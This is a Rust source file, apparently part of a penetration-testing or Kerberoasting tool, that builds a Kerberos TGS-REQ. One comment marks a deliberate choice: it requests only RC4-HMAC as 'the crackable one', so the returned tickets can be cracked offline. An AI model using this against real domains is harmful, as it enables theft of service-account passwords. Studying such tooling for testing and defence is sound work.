//! TGS-REQ builder (RFC 4120 §5.4.1, msg-type 12).

use crate::error::KrbError;
use crate::kerberos::asn1::*;
use crate::kerberos::crypto::{rc4_hmac_encrypt, aes_hmac_sha1_encrypt};

pub fn build_tgs_req(
    spn: &str,
    realm: &str,
    username: &str,
    tgt_der: &[u8],      // raw bytes from as_rep.ticket_der (content of ctx[5])
    session_key: &[u8],
    session_etype: i64,
    nonce: u32,
) -> Result<Vec<u8>, KrbError> {

    // ── Authenticator (APPLICATION 2 = 0x62) ─────────────────────────────────
    let now   = chrono::Utc::now();
    let ctime = now.format("%Y%m%d%H%M%SZ").to_string();
    let cusec = now.timestamp_subsec_micros();

    let auth_seq = sequence(&[
        ctx(0, &encode_integer(5)),                      // authenticator-vno
        ctx(1, &encode_realm(realm)),                    // crealm
        ctx(2, &encode_principal_name(1, &[username])),  // cname
        ctx(4, &encode_uint(cusec)),                     // cusec
        ctx(5, &encode_generalized_time(&ctime)),        // ctime
    ].concat());
    let authenticator = tlv(0x62, &auth_seq);

    // Encrypt authenticator with the session key's etype (key-usage 7).
    let (enc_auth_bytes, auth_etype) = match session_etype {
        17 | 18 => (aes_hmac_sha1_encrypt(session_key, 7, &authenticator), session_etype),
        _       => (rc4_hmac_encrypt(session_key, 7, &authenticator), 23i64),
    };
    let enc_auth_data = sequence(&[
        ctx(0, &encode_integer(auth_etype)),
        ctx(2, &encode_octet(&enc_auth_bytes)),
    ].concat());

    // ── Ticket blob ───────────────────────────────────────────────────────────
    // tgt_der is the raw content of the ctx[5] field from AS-REP.
    // It should already start with 0x61 (APPLICATION 1 = Ticket).
    // If it does not (some parsers strip it), wrap it.
    let ticket_blob: Vec<u8> = if !tgt_der.is_empty() && tgt_der[0] == 0x61 {
        tgt_der.to_vec()
    } else {
        // Wrap as APPLICATION 1
        tlv(0x61, tgt_der)
    };

    // ── AP-REQ (APPLICATION 14 = 0x6e) ───────────────────────────────────────
    let ap_options = tlv(0x03, &[0x00u8, 0x00, 0x00, 0x00, 0x00]); // no flags
    let ap_req_seq = sequence(&[
        ctx(0, &encode_integer(5)),     // pvno
        ctx(1, &encode_integer(14)),    // msg-type AP-REQ
        ctx(2, &ap_options),
        ctx(3, &ticket_blob),
        ctx(4, &enc_auth_data),
    ].concat());
    let ap_req = tlv(0x6e, &ap_req_seq);

    // PA-DATA type 1 (PA-TGS-REQ) = AP-REQ
    let pa_tgs = sequence(&[
        ctx(1, &encode_integer(1)),
        ctx(2, &encode_octet(&ap_req)),
    ].concat());
    // RFC 4120: padata is SEQUENCE OF PA-DATA, not SET
    let pa_data_seq = sequence(&pa_tgs);

    // ── sname from SPN ────────────────────────────────────────────────────────
    // "MSSQLSvc/db.corp.local:1433" → NT-SRV-INST [2] parts: ["MSSQLSvc","db.corp.local:1433"]
    // "HOST/machine"               → NT-SRV-INST [2]
    let sname = match spn.splitn(2, '/').collect::<Vec<_>>().as_slice() {
        [svc, host] => encode_principal_name(2, &[svc, host]),
        _           => encode_principal_name(1, &[spn]),
    };

    // ── KDC-REQ-BODY ─────────────────────────────────────────────────────────
    // Same flags as AS-REQ (matches Impacket): forwardable(1)|proxiable(3)|renewable(8)
    let kdc_options_bits: u32 = 0x50800000;
    let kdc_options = tlv(0x03, &[
        0x00u8,
        ((kdc_options_bits >> 24) & 0xFF) as u8,
        ((kdc_options_bits >> 16) & 0xFF) as u8,
        ((kdc_options_bits >> 8)  & 0xFF) as u8,
        ( kdc_options_bits        & 0xFF) as u8,
    ]);
    let till = encode_generalized_time("20370913024805Z");
    // Request only etype 23 (RC4-HMAC) — the crackable one
    let etype_list: Vec<u8> = [23i64].iter().flat_map(|e| encode_integer(*e)).collect();

    let body = sequence(&[
        ctx(0, &kdc_options),
        ctx(2, &encode_realm(realm)),  // realm
        ctx(3, &sname),
        ctx(5, &till),
        ctx(7, &encode_uint(nonce)),
        ctx(8, &sequence(&etype_list)),
    ].concat());

    // ── TGS-REQ (APPLICATION 12 = 0x6c) ──────────────────────────────────────
    let kdc_req = sequence(&[
        ctx(1, &encode_integer(5)),
        ctx(2, &encode_integer(12)),   // msg-type TGS-REQ
        ctx(3, &pa_data_seq),
        ctx(4, &body),
    ].concat());

    Ok(tlv(0x6c, &kdc_req))
}
